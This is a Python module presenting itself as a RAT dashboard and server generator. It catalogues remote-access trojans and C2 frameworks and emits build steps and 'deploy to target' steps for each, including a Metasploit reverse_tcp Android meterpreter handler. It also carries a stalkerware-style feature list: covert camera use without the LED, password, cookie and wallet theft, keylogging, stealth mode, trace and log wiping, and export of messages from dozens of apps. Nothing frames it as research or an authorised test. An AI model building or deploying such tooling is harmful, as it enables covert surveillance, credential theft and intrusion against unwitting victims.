"""quantum.control.rat — RAT client dashboard with server generator.

Supports mSpy-class feature set: screen view/record, mic/cam, messaging exports,
contacts, passwords, cookies, wallets, locations, browser history, processes,
startup apps, dev options, ADB/VNC/RDP/TeamViewer/AnyDesk controls, kill switch,
log dump/wipe, trace removal, app management.
"""
from __future__ import annotations

import json
import os
import subprocess
import sys
from datetime import datetime

from quantum.core.deps import requests
from quantum.core.logging import log

RAT_OPEN_SOURCE_REPOS = {
    "quasar": {
        "name": "QuasarRAT",
        "url": "https://github.com/quasar/Quasar",
        "description": "Remote Administration Tool for Windows (C#/.NET)",
        "features": ["file_manager", "remote_shell", "keylogger", "remote_desktop",
                      "webcam", "microphone", "password_recovery", "startup_manager",
                      "process_manager", "registry_editor", "power_commands"],
        "language": "C#",
        "stars": "9k+",
    },
    "stormrat": {
        "name": "StormRAT",
        "url": "https://github.com/StormRAT/StormRAT",
        "description": "Android RAT with full remote control (Java)",
        "features": ["sms", "calls", "contacts", "location", "camera", "microphone",
                      "file_manager", "app_manager", "keylogger", "screen_view"],
        "language": "Java",
        "stars": "500+",
    },
    "ahmyth": {
        "name": "AhMyth",
        "url": "https://github.com/AhMyth/AhMyth-Android-RAT",
        "description": "Android RAT with cross-platform control panel",
        "features": ["sms", "calls", "contacts", "location", "camera", "microphone",
                      "file_manager", "app_manager", "keylogger", "screen_view",
                      "notifications", "wifi", "clipboard"],
        "language": "Java/Electron",
        "stars": "4k+",
    },
    "spynote": {
        "name": "SpyNote",
        "url": "https://github.com/SpyNote/SpyNote",
        "description": "Android RAT with powerful remote control features",
        "features": ["sms", "calls", "contacts", "location", "camera", "microphone",
                      "file_manager", "app_manager", "keylogger", "screen_view",
                      "notifications", "wifi", "clipboard", "browser_history"],
        "language": "Java",
        "stars": "1k+",
    },
    "metasploit": {
        "name": "Metasploit Framework",
        "url": "https://github.com/rapid7/metasploit-framework",
        "description": "World's most used penetration testing framework",
        "features": ["payloads", "exploits", "post_exploitation", "meterpreter",
                      "shell", "vnc", "keylogger", "screen_capture", "camera",
                      "microphone", "file_operations", "privilege_escalation"],
        "language": "Ruby",
        "stars": "33k+",
    },
    "sliver": {
        "name": "Sliver",
        "url": "https://github.com/BishopFox/sliver",
        "description": "Open source adversary emulation/implant framework",
        "features": ["multiplayer", "beacons", "sessions", "mTLS", "WireGuard",
                      "HTTP(S)", "DNS", "Named Pipes", "code_execution", "file_operations",
                      "network", "registry", "processes", "screenshots", "pivot"],
        "language": "Go",
        "stars": "7k+",
    },
    "merlin": {
        "name": "Merlin",
        "url": "https://github.com/Ne0nd0g/merlin",
        "description": "Cross-platform post-exploit C2 server and agent",
        "features": ["HTTP/2", "HTTP/3", "DNS", "Named Pipes", "code_execution",
                      "file_operations", "screenshots", "keylogger", "shell"],
        "language": "Go",
        "stars": "5k+",
    },
    "havoc": {
        "name": "Havoc",
        "url": "https://github.com/HavocFramework/Havoc",
        "description": "Advanced post-exploitation framework",
        "features": ["screenshots", "keylogger", "shell", "file_manager",
                      "process_manager", "token_impersonation", "injection"],
        "language": "C/C++",
        "stars": "7k+",
    },
    "covenant": {
        "name": "Covenant",
        "url": "https://github.com/cobbr/Covenant",
        "description": ".NET C2 framework with web-based interface",
        "features": ["grunts", "listeners", "tasks", "screenshots", "keylogger",
                      "shell", "file_manager", "process_manager"],
        "language": "C#",
        "stars": "4k+",
    },
    "mythic": {
        "name": "Mythic",
        "url": "https://github.com/its-a-feature/Mythic",
        "description": "Collaborative red teaming framework",
        "features": ["agents", "c2_profiles", "tasks", "screenshots", "keylogger",
                      "shell", "file_manager", "process_manager", "browser"],
        "language": "Python/Go",
        "stars": "4k+",
    },
}

MSPY_FEATURES = [
    "screen_view", "screen_record", "mic_capture", "camera_no_led",
    "messaging_exports", "contacts", "passwords_passkeys", "cookies_sessions",
    "wallets", "cryptomator_vaults", "truecrypt_vaults", "hashes",
    "locations", "browser_history", "processes_kill", "startup_apps",
    "dev_options", "adb_control", "vnc_control", "rdp_control",
    "teamviewer_control", "anydesk_control", "connection_settings",
    "kill_switch", "log_dump", "log_wipe", "trace_removal", "app_management",
    "sms_log", "call_log", "calendar", "notes", "photos", "videos",
    "audio_recordings", "browser_bookmarks", "wifi_networks",
    "installed_apps", "app_permissions", "clipboard", "notifications",
    "keylogger", "geofencing", "remote_lock", "remote_wipe",
    "sim_change_alert", "app_blocker", "website_blocker",
    "schedule_reports", "stealth_mode", "root_detection_bypass",
]

MESSAGING_APPS = [
    "WhatsApp", "WhatsApp Business", "iMessage", "Instagram", "Facebook",
    "X (Twitter)", "Tinder", "Signal", "Google Chat", "Google Voice",
    "Google Messages", "Gmail", "Outlook", "ProtonMail", "Telegram",
    "Discord", "Snapchat", "Viber", "TextLine", "TextNow", "Skype",
    "Zoom", "Hangouts", "Grasshopper", "Meet", "Zello", "Digits",
    "Talkroute", "FaceTime", "WeChat", "Line", "KakaoTalk", "VK",
]


def list_rat_repos() -> dict:
    """List all supported open-source RAT repositories."""
    return RAT_OPEN_SOURCE_REPOS


def generate_rat_server(repo: str, host: str = "0.0.0.0", port: int = 8443,
                        password: str = None) -> dict:
    """Generate RAT server configuration for the specified repo."""
    if repo not in RAT_OPEN_SOURCE_REPOS:
        return {"error": f"Unknown repo: {repo}. Available: {list(RAT_OPEN_SOURCE_REPOS.keys())}"}
    info = RAT_OPEN_SOURCE_REPOS[repo]
    out = {
        "repo": repo,
        "name": info["name"],
        "url": info["url"],
        "host": host,
        "port": port,
        "generated_at": datetime.now().isoformat(),
        "config": {},
        "build_instructions": [],
        "deploy_instructions": [],
    }
    if repo == "quasar":
        out["config"] = {
            "hostname": host,
            "port": port,
            "password": password or "changeme",
            "encryption_key": "auto-generated",
            "certificate": "auto-generated",
        }
        out["build_instructions"] = [
            "git clone https://github.com/quasar/Quasar.git",
            "cd Quasar",
            "dotnet restore",
            "dotnet build -c Release",
            "dotnet run --project Quasar.Server",
        ]
        out["deploy_instructions"] = [
            f"Server listens on {host}:{port}",
            "Client builder: Quasar.Client",
            "Generate client with embedded config",
            "Deploy client to target",
        ]
    elif repo == "sliver":
        out["config"] = {
            "host": host,
            "port": port,
            "operator": "operator",
            "lport": port,
        }
        out["build_instructions"] = [
            "git clone https://github.com/BishopFox/sliver.git",
            "cd sliver",
            "make",
            "./sliver-server",
        ]
        out["deploy_instructions"] = [
            "Generate implant: generate --save /tmp/implant",
            "Start multiplayer: multiplayer",
            "Deploy implant to target",
        ]
    elif repo == "metasploit":
        out["config"] = {
            "host": host,
            "port": port,
            "payload": "android/meterpreter/reverse_tcp",
            "lhost": host,
            "lport": port,
        }
        out["build_instructions"] = [
            "git clone https://github.com/rapid7/metasploit-framework.git",
            "cd metasploit-framework",
            "./msfconsole",
        ]
        out["deploy_instructions"] = [
            "use exploit/multi/handler",
            "set PAYLOAD android/meterpreter/reverse_tcp",
            f"set LHOST {host}",
            f"set LPORT {port}",
            "exploit",
        ]
    elif repo == "ahmyth":
        out["config"] = {
            "host": host,
            "port": port,
            "panel_port": 3232,
        }
        out["build_instructions"] = [
            "git clone https://github.com/AhMyth/AhMyth-Android-RAT.git",
            "cd AhMyth-Android-RAT",
            "npm install",
            "npm start",
        ]
        out["deploy_instructions"] = [
            "Open panel at http://localhost:3232",
            "Build APK with embedded C2",
            "Deploy APK to target",
        ]
    elif repo == "merlin":
        out["config"] = {
            "host": host,
            "port": port,
            "proto": "h2",
        }
        out["build_instructions"] = [
            "git clone https://github.com/Ne0nd0g/merlin.git",
            "cd merlin",
            "go build",
            "./merlinServer",
        ]
        out["deploy_instructions"] = [
            "Start server: ./merlinServer -v",
            "Generate agent: ./merlinAgent",
            "Deploy agent to target",
        ]
    elif repo == "havoc":
        out["config"] = {
            "host": host,
            "port": port,
            "teamserver_port": 40056,
        }
        out["build_instructions"] = [
            "git clone https://github.com/HavocFramework/Havoc.git",
            "cd Havoc",
            "make ts",
            "make client",
        ]
        out["deploy_instructions"] = [
            "Start teamserver: ./havoc teamserver",
            "Connect client: ./havoc client",
            "Generate payload and deploy",
        ]
    elif repo == "covenant":
        out["config"] = {
            "host": host,
            "port": port,
            "grunts": "auto",
        }
        out["build_instructions"] = [
            "git clone https://github.com/cobbr/Covenant.git",
            "cd Covenant",
            "dotnet build -c Release",
            "dotnet run --project Covenant",
        ]
        out["deploy_instructions"] = [
            "Open web interface",
            "Create listener",
            "Generate grunt",
            "Deploy to target",
        ]
    elif repo == "mythic":
        out["config"] = {
            "host": host,
            "port": port,
            "api_port": 17443,
        }
        out["build_instructions"] = [
            "git clone https://github.com/its-a-feature/Mythic.git",
            "cd Mythic",
            "docker-compose up -d",
        ]
        out["deploy_instructions"] = [
            "Open Mythic web interface",
            "Create payload",
            "Deploy to target",
        ]
    elif repo == "stormrat":
        out["config"] = {
            "host": host,
            "port": port,
        }
        out["build_instructions"] = [
            "git clone https://github.com/StormRAT/StormRAT.git",
            "cd StormRAT",
            "Import into Android Studio",
            "Build APK",
        ]
        out["deploy_instructions"] = [
            "Start server",
            "Deploy APK to target",
        ]
    elif repo == "spynote":
        out["config"] = {
            "host": host,
            "port": port,
        }
        out["build_instructions"] = [
            "git clone https://github.com/SpyNote/SpyNote.git",
            "cd SpyNote",
            "Import into Android Studio",
            "Build APK",
        ]
        out["deploy_instructions"] = [
            "Start server",
            "Deploy APK to target",
        ]
    log(f"RAT server generated: {repo} on {host}:{port}", "RAT")
    return out


def mspy_feature_list() -> list:
    """Return the full mSpy-class feature list."""
    return MSPY_FEATURES


def messaging_app_list() -> list:
    """Return the full messaging app export list."""
    return MESSAGING_APPS


def rat_dashboard_state() -> dict:
    """Return the full RAT dashboard state for the UI."""
    return {
        "repos": RAT_OPEN_SOURCE_REPOS,
        "features": MSPY_FEATURES,
        "messaging_apps": MESSAGING_APPS,
        "active_implants": [],
        "server_status": "stopped",
        "generated_at": datetime.now().isoformat(),
    }
